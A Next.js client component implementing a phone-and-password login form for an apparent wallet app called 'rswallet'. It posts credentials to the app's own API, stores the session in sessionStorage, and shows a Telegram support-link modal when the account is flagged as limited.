'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function LoginForm() {
  const router = useRouter();
  const [mobile, setMobile] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [limited, setLimited] = useState(null);

  async function submit(event) {
    event.preventDefault();
    setError('');
    if (!/^\d{10}$/.test(mobile)) return setError('Please enter a valid 10-digit phone number.');
    if (password.length < 4) return setError('Password must contain at least 4 characters.');
    setLoading(true);
    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mobile, password }),
      });
      const data = await response.json();
      if (!response.ok) throw new Error(data.error || 'Login failed');
      if (data.limited) return setLimited(data.telegramUrl || '/');
      sessionStorage.setItem('rswallet_session', JSON.stringify(data.session));
      router.push('/home');
    } catch (cause) {
      setError(cause.message || 'An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  }

  return (
    <>
      <form className="login-form" onSubmit={submit}>
        <div className="login-fields">
          <label className="field">
            <span className="field-icon phone-icon" aria-hidden="true" />
            <span className="sr-only">Phone number</span>
            <input
              type="tel"
              inputMode="numeric"
              autoComplete="tel"
              value={mobile}
              onChange={(event) => setMobile(event.target.value.replace(/\D/g, '').slice(0, 10))}
              placeholder="Enter Your Phone Number"
              required
            />
          </label>
          <label className="field">
            <span className="field-icon lock-icon" aria-hidden="true" />
            <span className="sr-only">Password</span>
            <input
              type="password"
              autoComplete="current-password"
              value={password}
              onChange={(event) => setPassword(event.target.value)}
              placeholder="Enter Password"
              required
            />
          </label>
          {error && <p className="form-error" role="alert">{error}</p>}
        </div>
        <button className="primary login-button" disabled={loading}>
          {loading ? 'PLEASE WAIT…' : 'LOG IN'}
        </button>
      </form>
      {limited && (
        <div className="modal" role="dialog" aria-modal="true" aria-label="Request received">
          <div className="dialog">
            <h2>Update Request Already Received</h2>
            <p>Please wait some time. You can use the available support link.</p>
            <a className="primary link-button" href={limited}>Continue</a>
          </div>
        </div>
      )}
    </>
  );
}
